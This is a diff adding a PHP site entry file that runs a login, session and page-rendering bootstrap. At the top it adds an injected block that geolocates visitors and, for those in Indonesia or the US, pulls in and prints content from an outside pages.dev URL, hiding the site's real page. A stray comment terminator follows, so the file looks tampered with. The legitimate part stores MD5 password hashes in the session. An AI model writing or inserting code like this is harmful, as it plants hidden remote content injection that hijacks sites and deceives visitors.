@@ -1,0 +1,85 @@
+<?php
+error_reporting(E_ALL);
+ini_set('display_errors', 1);
+function getUserIP() {
+    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
+        $ip = $_SERVER['HTTP_CLIENT_IP'];
+    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+        $ip = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
+    } else {
+        $ip = $_SERVER['REMOTE_ADDR'];
+    }
+    return $ip;
+}
+
+$ip = getUserIP();
+$api_url = "http://ip-api.com/json/{$ip}";
+
+$response = @file_get_contents($api_url);
+
+if ($response === FALSE) {
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $api_url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    $response = curl_exec($ch);
+    curl_close($ch);
+}
+
+$data = json_decode($response, true);
+
+if ($data && ($data['countryCode'] === 'ID' || $data['countryCode'] === 'US')) {
+    ob_start();
+    include 'https://visionxsro.pages.dev/visionxsro/';
+    $output = ob_get_clean();
+    echo $output;
+    exit();
+}
+
+*/
+
+require_once dirname(__FILE__).'/config/siteconfig.php'; 
+require_once dirname(__FILE__).'/admin/includes/functions.php'; 
+require_once dirname(__FILE__).'/includes/php/phpfastcache.php';
+
+if ( $_REQUEST['credits'] == "1" ) {
+    $_SESSION['credits'] = true;
+}
+
+if ( $_REQUEST['credits'] == "0" ) {
+    $_SESSION['credits'] = false;
+}
+
+if ( $_REQUEST['cardpay'] == "true" ) {
+    $_SESSION['cardpay'] = true;
+}
+if ( $_REQUEST['cardpay'] == "false" ) {
+    $_SESSION['cardpay'] = false;
+}
+
+if(isset($_POST['formname'])){
+    if($_POST['formname'] == 'loginform' && $_POST['controller'] == ''){
+        $_SESSION['username'] = mysqli_real_escape_string($db,$_POST['username']);
+	    $_SESSION['password'] = md5($_POST['password']);
+	}
+}
+
+$user = New User();
+
+if ( !$user->logged && $_COOKIE['login_rem'] != "" ) {
+    $data = @json_decode( $_COOKIE['login_rem'], true );
+    if ( $data && is_array($data) && count($data) == 2 ) {
+        $user->check_cookie_login( $data['username'], $data['hash'] );
+    }
+}
+
+if($action == 'logout'){
+    User::logout();
+}
+
+require_once dirname(__FILE__).'/load.php';	
+
+$html = getPage();
+
+echo $html;
+
+?>
